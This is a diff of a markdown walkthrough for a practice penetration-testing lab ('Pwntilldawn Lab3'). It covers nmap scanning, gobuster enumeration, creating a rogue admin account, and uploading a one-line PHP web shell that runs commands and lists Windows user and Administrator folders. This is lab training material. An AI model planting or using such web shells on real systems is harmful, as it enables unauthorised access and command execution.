@@ -1,8 +1,9 @@
 # Pwntilldawn-Lab3
 1. Looking for ip
-   `nmap -sn 10.150.150.0/24` (or even better do this)
-   `nmap -p 80,21,22,445 10.150.150.0/24`
-
+   `nmap -sn 10.150.150.0/24` 
+   (Picture)
+   
+   or even better do this `nmap -p 80,21,22,445 10.150.150.0/24`)
 Note this for:
   This tells Nmap to ONLY scan specific ports instead of all ports: <br/>
 80 → HTTP (web server)
@@ -22,6 +23,7 @@ Has
 
  2.`gobuster dir -u http://10.150.150.11 -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak`
  (Picture here)
+ (Picture here)
 
 Has several HTTP links we can try to access<br>
 
@@ -33,16 +35,16 @@ Has several HTTP links we can try to access<br>
 
 4. Inside http://10.150.150.11, there's a decent directory to get into, which is the addedituser.php
    Create a user with an admin role
-   (Picture)
 
-  Extra: Access to admin account using simple tricks.
+  Extra: Access to admin account using simple tricks (Inspect Q). change type=password into type=text
   (Picture)
 
 5. Create a simple webshell to run commands through the browser.
    `<?php system($_GET['cmd']); ?>` save it as "shell.php"
    Afterward, upload it into your accounts.
+   (Picture)
 
-6. Uploading the files into the new folder http://10.150.150.11/upload/12
+7. Force uploading the files into the new folder of http://10.150.150.11/upload/12
    Reason to run the PHP file on the web.
    http://10.150.150.11/upload/12/shell.php
    http://10.150.150.11/upload/12/shell.php?cmd=hostname
@@ -52,10 +54,7 @@ Has several HTTP links we can try to access<br>
    (Picture)
 
 # Because we know it's a window
-   http://10.150.150.11/upload/12/shell.phpcmd=dir C:\
-   (Picture)
-   
-   http://10.150.150.11/upload/12/shell.php?cmd=dir C:\Users
+  http://10.150.150.11/upload/12/shell.php?cmd=dir C:\Users
    (Picture)
 
    http://10.150.150.11/upload/12/shell.php?cmd=dir C:\Users\Administrator\Desktop
